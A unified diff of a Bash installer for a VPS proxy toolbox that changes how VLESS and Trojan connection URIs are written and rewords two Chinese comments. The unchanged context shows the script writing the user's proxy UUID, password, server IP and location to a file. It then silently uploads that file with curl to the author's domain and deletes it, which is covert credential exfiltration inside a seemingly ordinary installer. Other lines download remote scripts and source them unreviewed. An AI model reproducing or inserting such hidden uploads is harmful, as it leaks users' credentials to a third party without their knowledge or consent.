@@ -184,8 +184,8 @@ prasejson
 apt-get autoremove -y
 cd /root
 if [[ -n ${uuid_new} ]]; then
-echo "vless://${uuid_new}@${domain}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip})" &> ${myip}.txt
-echo "trojan://${password1}@${domain}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip})" >> ${myip}.txt
+echo "vless://${uuid_new}@${myip}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip})" &> ${myip}.txt
+echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip})" >> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
 fi
@@ -462,7 +462,7 @@ MasterMenu() {
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/userinput.sh
     source userinput.sh
     userinput_standard
-    ## 检测证书是否已有
+    ## 检测证书是否已存在
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/detectcert.sh
     source detectcert.sh
     detectcert
@@ -480,7 +480,7 @@ MasterMenu() {
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/firewall.sh
     source firewall.sh
     openfirewall
-    ## NGINX安装
+    ## 安装NGINX
     echo "nameserver 1.1.1.1" > /etc/resolv.conf
     echo "nameserver 1.0.0.1" >> /etc/resolv.conf
     curl --retry 5 -LO https://raw.githubusercontent.com/johnrosen1/vpstoolbox/master/install/nginx.sh
